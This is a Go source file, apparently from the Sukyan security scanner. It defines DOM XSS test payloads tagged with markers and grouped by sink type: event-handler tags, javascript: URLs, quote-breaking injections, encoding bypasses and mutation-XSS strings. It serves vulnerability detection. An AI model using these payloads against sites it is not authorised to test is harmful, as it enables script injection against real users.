package payloads

import (
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/pyneda/sukyan/pkg/web"
)

// DOMXSSPayload represents a DOM XSS test payload
type DOMXSSPayload struct {
	Value       string
	Marker      string
	TargetSinks []web.DOMXSSSinkType
	Confidence  int
	Description string
}

// TaintMarkerPrefix is the prefix used for taint tracking payloads
const TaintMarkerPrefix = "__SUKYAN_DOM_"

var markerRand = rand.New(rand.NewSource(time.Now().UnixNano()))

// GenerateMarker generates a unique marker for DOM XSS payloads
func GenerateMarker() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = charset[markerRand.Intn(len(charset))]
	}
	return string(b)
}

// GetDOMXSSPayloads returns all DOM XSS payloads, each with a unique marker
func GetDOMXSSPayloads() []DOMXSSPayload {
	return GetDOMXSSPayloadsWithUniqueMarkers()
}

// GetDOMXSSPayloadsWithUniqueMarkers returns DOM XSS payloads where each payload has its own unique marker
func GetDOMXSSPayloadsWithUniqueMarkers() []DOMXSSPayload {
	return buildPayloads(func() string { return GenerateMarker() })
}

// GetDOMXSSPayloadsWithMarker returns DOM XSS payloads using the specified marker (same marker for all)
func GetDOMXSSPayloadsWithMarker(marker string) []DOMXSSPayload {
	return buildPayloads(func() string { return marker })
}

// buildPayloads creates the payload list using the provided marker generator function.
// This allows generating unique markers per payload or using a shared marker.
func buildPayloads(markerGen func() string) []DOMXSSPayload {
	// Helper to create a payload with a fresh marker from the generator
	makePayload := func(template string, sinks []web.DOMXSSSinkType, confidence int, desc string) DOMXSSPayload {
		m := markerGen()
		return DOMXSSPayload{
			Value:       fmt.Sprintf(template, m),
			Marker:      m,
			TargetSinks: sinks,
			Confidence:  confidence,
			Description: desc,
		}
	}

	// For taint marker payload which needs two format args
	makeTaintPayload := func(sinks []web.DOMXSSSinkType, confidence int, desc string) DOMXSSPayload {
		m := markerGen()
		return DOMXSSPayload{
			Value:       fmt.Sprintf(`%s%s`, TaintMarkerPrefix, m),
			Marker:      m,
			TargetSinks: sinks,
			Confidence:  confidence,
			Description: desc,
		}
	}

	htmlAndJQuery := []web.DOMXSSSinkType{web.SinkTypeHTMLExecution, web.SinkTypejQuery}
	jsExec := []web.DOMXSSSinkType{web.SinkTypeJSExecution}
	urlSetter := []web.DOMXSSSinkType{web.SinkTypeURLSetter}
	htmlExec := []web.DOMXSSSinkType{web.SinkTypeHTMLExecution}
	allSinks := []web.DOMXSSSinkType{web.SinkTypeHTMLExecution, web.SinkTypeJSExecution, web.SinkTypeURLSetter, web.SinkTypejQuery}

	return []DOMXSSPayload{
		// HTML Execution payloads (for innerHTML, document.write, etc.)
		makePayload(`<img src=x onerror=alert('%s')>`, htmlAndJQuery, 95, "Image tag with onerror handler"),
		makePayload(`<svg onload=alert('%s')>`, htmlAndJQuery, 95, "SVG tag with onload handler"),
		makePayload(`<script>alert('%s')</script>`, htmlAndJQuery, 90, "Script tag"),
		makePayload(`<body onload=alert('%s')>`, htmlAndJQuery, 85, "Body tag with onload handler"),
		makePayload(`<iframe src="javascript:alert('%s')">`, htmlAndJQuery, 80, "Iframe with javascript URL"),
		makePayload(`<details open ontoggle=alert('%s')>`, htmlAndJQuery, 85, "Details tag with ontoggle handler"),
		makePayload(`<input onfocus=alert('%s') autofocus>`, htmlAndJQuery, 90, "Input with autofocus and onfocus handler"),
		makePayload(`<video><source onerror=alert('%s')>`, htmlAndJQuery, 85, "Video source with onerror handler"),
		makePayload(`<marquee onstart=alert('%s')>`, htmlAndJQuery, 75, "Marquee with onstart handler (legacy)"),
		makePayload(`<select autofocus onfocus=alert('%s')>`, htmlAndJQuery, 85, "Select with autofocus and onfocus"),
		makePayload(`<textarea autofocus onfocus=alert('%s')>`, htmlAndJQuery, 85, "Textarea with autofocus and onfocus"),
		// Encoding bypass payloads
		makePayload(`<img src=x onerror=&#97;lert('%s')>`, htmlAndJQuery, 85, "Image onerror with HTML entity encoded alert"),
		makePayload(`<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;('%s')>`, htmlAndJQuery, 80, "SVG onload with hex entity encoded alert"),

		// JavaScript Execution payloads (for eval, setTimeout, etc.)
		makePayload(`alert('%s')`, jsExec, 95, "Direct alert call"),
		makePayload(`'-alert('%s')-'`, jsExec, 90, "String breaking with alert"),
		makePayload(`";alert('%s');//`, jsExec, 85, "Double quote breaking with alert"),
		makePayload(`';alert('%s');//`, jsExec, 85, "Single quote breaking with alert"),
		makePayload("${alert('%s')}", jsExec, 90, "Template literal interpolation"),
		makePayload("`${alert('%s')}`", jsExec, 85, "Full template literal with interpolation"),
		makePayload("`;alert('%s')//`", jsExec, 80, "Backtick breaking with alert"),
		makePayload(`\u0061lert('%s')`, jsExec, 80, "Unicode escaped 'a' in alert"),
		makePayload(`});alert('%s');//`, jsExec, 80, "Object/function breaking with alert"),
		makePayload(`]);alert('%s');//`, jsExec, 80, "Array breaking with alert"),

		// URL Setter payloads (for location.href, location.assign, etc.)
		makePayload(`javascript:alert('%s')`, urlSetter, 95, "JavaScript URL scheme"),
		makePayload(`javascript:alert('%s')//`, urlSetter, 90, "JavaScript URL scheme with comment"),
		makePayload(`JaVaScRiPt:alert('%s')`, urlSetter, 90, "JavaScript URL with mixed case"),
		makePayload("javascript:\nalert('%s')", urlSetter, 85, "JavaScript URL with newline"),
		makePayload("javascript:\talert('%s')", urlSetter, 85, "JavaScript URL with tab"),
		makePayload(`javascript:/%%0Aalert('%s')`, urlSetter, 80, "JavaScript URL with URL-encoded newline"),
		makePayload(`javascript:/**/alert('%s')`, urlSetter, 85, "JavaScript URL with comment padding"),
		makePayload(`data:text/html,<script>alert('%s')</script>`, urlSetter, 85, "Data URI with HTML and script"),

		// Mutation XSS (mXSS) payloads
		makePayload(`<noscript><p title="</noscript><img src=x onerror=alert('%s')>">`, htmlExec, 85, "mXSS via noscript tag parsing"),
		makePayload(`<math><mtext><table><mglyph><style><img src=x onerror=alert('%s')>`, htmlExec, 80, "mXSS via MathML context switching"),
		makePayload(`<svg><![CDATA[><img src=x onerror=alert('%s')>]]>`, htmlExec, 75, "mXSS via SVG CDATA section"),

		// Taint tracking only payload (for detection without execution)
		makeTaintPayload(allSinks, 70, "Taint marker for flow detection"),
	}
}

// GetPayloadsForSinkType returns payloads suitable for a specific sink type, each with a unique marker
func GetPayloadsForSinkType(sinkType web.DOMXSSSinkType) []DOMXSSPayload {
	allPayloads := GetDOMXSSPayloads()

	var filtered []DOMXSSPayload
	for _, p := range allPayloads {
		for _, targetSink := range p.TargetSinks {
			if targetSink == sinkType {
				filtered = append(filtered, p)
				break
			}
		}
	}
	return filtered
}

// ContainsMarker checks if a string contains the payload marker
func ContainsMarker(text, marker string) bool {
	return len(marker) > 0 && len(text) > 0 && strings.Contains(text, marker)
}

// ContainsTaintMarker checks if a string contains a taint marker
func ContainsTaintMarker(text string) bool {
	return strings.Contains(text, TaintMarkerPrefix)
}

